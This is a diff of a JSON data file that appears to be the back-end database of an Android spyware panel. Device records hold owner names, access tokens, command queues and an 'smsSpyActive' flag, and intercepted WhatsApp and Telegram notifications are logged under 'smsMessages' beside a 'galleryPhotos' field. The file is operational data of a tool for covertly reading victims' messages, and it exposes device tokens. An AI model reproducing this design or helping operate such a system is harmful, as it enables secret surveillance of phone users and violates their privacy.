@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781791324,
+    "lastSeen": 1776781797391,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -10404,6 +10404,14 @@
     "smsSpyActive": true,
     "smsMessages": [
       {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "21/04 21:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781797964
+      },
+      {
         "appName": "Telegram",
         "sender": "Telegram",
         "content": "Pesan baru",
@@ -14394,14 +14402,6 @@
         "time": "21/04 21:08",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776780524826
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram: Pengguna",
-        "content": "Pesan baru",
-        "time": "21/04 21:08",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776780520656
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781792810,
+    "lastSeen": 1776781795728,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
